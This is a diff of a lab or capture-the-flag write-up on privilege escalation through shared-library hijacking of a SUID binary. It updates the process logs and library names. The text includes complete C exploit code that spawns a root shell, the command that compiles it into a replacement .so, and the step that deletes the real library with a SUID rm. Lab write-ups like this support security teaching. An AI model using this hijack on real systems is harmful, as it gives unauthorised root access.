@@ -60,11 +60,11 @@ $ find / -perm -4000 2> /dev/null
 $ file restart_servers 
 restart_servers: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=037d8a491f80ebc4daa6f9c41815f0b3d49cef82, stripped
 $ ./restart_servers 
-[*] Cleaning all ports
-	[*] Killing port 9090
-	[*] Killing port 9091
-	[*] Killing port 9092
-[*] All ports cleaned
+[*] Cleaning all servers
+	[*] Killing server server.js
+	[*] Killing server server.go
+	[*] Killing server server.py
+[*] All servers cleaned
 [*] Restart services
 [*] Services restarted
 ```
@@ -79,21 +79,21 @@ scp -P 22 pspy64s user1@localhost:~
 Let's run it and check the processes.
 
 ```
-2022/05/16 13:05:47 CMD: UID=0    PID=138    | ./restart_servers 
-2022/05/16 13:05:47 CMD: UID=0    PID=139    | sh -c /sbin/ldconfig 
-2022/05/16 13:05:47 CMD: UID=0    PID=140    | /bin/sh /sbin/ldconfig 
-2022/05/16 13:05:47 CMD: UID=0    PID=141    | /bin/kc 
-2022/05/16 13:05:47 CMD: UID=0    PID=142    | /bin/fuser 9090/tcp -k 
-2022/05/16 13:05:47 CMD: UID=0    PID=143    | /bin/fuser 9091/tcp -k 
-2022/05/16 13:05:47 CMD: UID=0    PID=144    | /bin/fuser 9092/tcp -k 
-2022/05/16 13:05:47 CMD: UID=0    PID=147    | /usr/bin/python3 /home/user1/servers/src/server.py 
-2022/05/16 13:05:47 CMD: UID=0    PID=146    | /home/user1/servers/src/server.go 
-2022/05/16 13:05:47 CMD: UID=0    PID=145    | /usr/bin/node /home/user1/servers/src/server.js 
+2022/05/26 18:30:06 CMD: UID=0    PID=418    | ./restart_servers 
+2022/05/26 18:30:06 CMD: UID=0    PID=419    | sh -c /sbin/ldconfig 
+2022/05/26 18:30:06 CMD: UID=0    PID=420    | /bin/sh /sbin/ldconfig 
+2022/05/26 18:30:06 CMD: UID=0    PID=421    | /bin/kc 
+2022/05/26 18:30:06 CMD: UID=0    PID=422    | /usr/bin/pkill server.js 
+2022/05/26 18:30:06 CMD: UID=0    PID=423    | /usr/bin/pkill server.go 
+2022/05/26 18:30:06 CMD: UID=0    PID=424    | /usr/bin/pkill server.py 
+2022/05/26 18:30:06 CMD: UID=0    PID=427    | /usr/bin/python3 /home/user1/servers/src/server.py 
+2022/05/26 18:30:06 CMD: UID=0    PID=426    | /home/user1/servers/src/server.go 
+2022/05/26 18:30:06 CMD: UID=0    PID=425    | /usr/bin/node /home/user1/servers/src/server.js
 ```
 There are a few things going on here. Our binary runs other processes:
  - ldconfig: configure dynamic linker run-time bindings
  - kc: ???
- - fuser:  identify processes using files or sockets, used to kill processes on specific ports
+ - pkill: kills a process by mathcing the name
  - server.py
  - server.go
  - server.js
@@ -103,7 +103,7 @@ If you try to run /bin/kc, you'll understand that the process tree looks like th
 restart_servers
 ├── ldconfig
 ├── kc
-    └─ fuser
+    └─ pkill
 ├── server.py
 ├── server.js
 └── server.go
@@ -116,11 +116,11 @@ But `ldconfig` is a very good hint. It has probably something to do with shared 
 ```
 $ ldd /bin/kc
 	linux-vdso.so.1 (0x00007ffcb47e3000)
-	libgenports.so => /home/user1/servers/libs/libgenports.so (0x00007f32a91b0000)
+	libgenprocs.so => /home/user1/servers/libs/libgenprocs.so (0x00007f32a91b0000)
 	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f32a8dbf000)
 	/lib64/ld-linux-x86-64.so.2 (0x00007f32a95b4000)
 ```
-The `kc` binary (kill connection) uses a shared library `/home/user1/servers/libs/libgenports.so`. The folder `/home/user1/servers/libs/` is not writable by our current user.
+The `kc` binary (kill connection) uses a shared library `/home/user1/servers/libs/libgenprocs.so`. The folder `/home/user1/servers/libs/` is not writable by our current user.
 
 Let's find out, how `kc` knows where to look for the library. There are a few ways to indicate the location of a dynamic shared library. Some of then are using environment variables, like `LD_LIBRARY_PATH`. We have no indication that such variables are kept during our call at the SUID binary.
 
@@ -141,14 +141,14 @@ Before writing the exploit, we need to figure out the name of the function that 
 
 A simple strings will to the job.
 ```
-$ strings libgenports.so 
+$ strings libgenprocs.so 
 __gmon_start__
 _init
 _fini
 _ITM_deregisterTMCloneTable
 _ITM_registerTMCloneTable
 __cxa_finalize
-genports <-----
+genprocs <-----
 _edata
 __bss_start
 _end
@@ -161,7 +161,7 @@ Let's write a generic library hijacking exploit...
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
-void genports() {
+void genprocs() {
         printf("[%] Running exploit\n");
         setreuid(geteuid(), geteuid());
         execve("/bin/sh", 0, 0);
@@ -169,20 +169,20 @@ void genports() {
 ```
 ...and compile it.
 ```bash
-gcc -fPIC -shared -o libgenports.so exploit.c
+gcc -fPIC -shared -o libgenprocs.so exploit.c
 ```
 
 Last thing is to get rid of the legitimate library using the SUID rm binary.
 
 ```
-$ servers/rm servers/libs/libgenports.so 
+$ servers/rm servers/libs/libgenprocs.so 
 ```
 
 We don't have to worry about relinking, because `ldconfig`  is called as root when running `restart_servers`.
 
 ```
 $ ./restart_servers 
-[*] Cleaning all ports
+[*] Cleaning all severs
 [%] Running exploit
 # id
 uid=0(root) gid=1000(user1) groups=1000(user1)
